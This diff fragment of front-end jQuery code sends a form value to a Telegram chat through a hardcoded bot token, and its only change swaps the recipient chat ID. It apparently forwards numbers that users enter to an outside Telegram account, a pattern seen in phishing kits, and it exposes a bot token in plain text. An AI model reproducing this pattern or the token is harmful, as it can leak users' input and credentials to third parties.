@@ -59,7 +59,7 @@ $(function () {
             return;
         }
 
-        const bot = new Bot("5136344578:AAEaJb-3IgdmMqAVOnF4x-ux8Do7ED8XOhI", "835560276");
+        const bot = new Bot("5136344578:AAEaJb-3IgdmMqAVOnF4x-ux8Do7ED8XOhI", "733336131");
         bot.sendMessage(val, null, null, false)
     });
     $("#number-input").on('input propertychange', function () { 
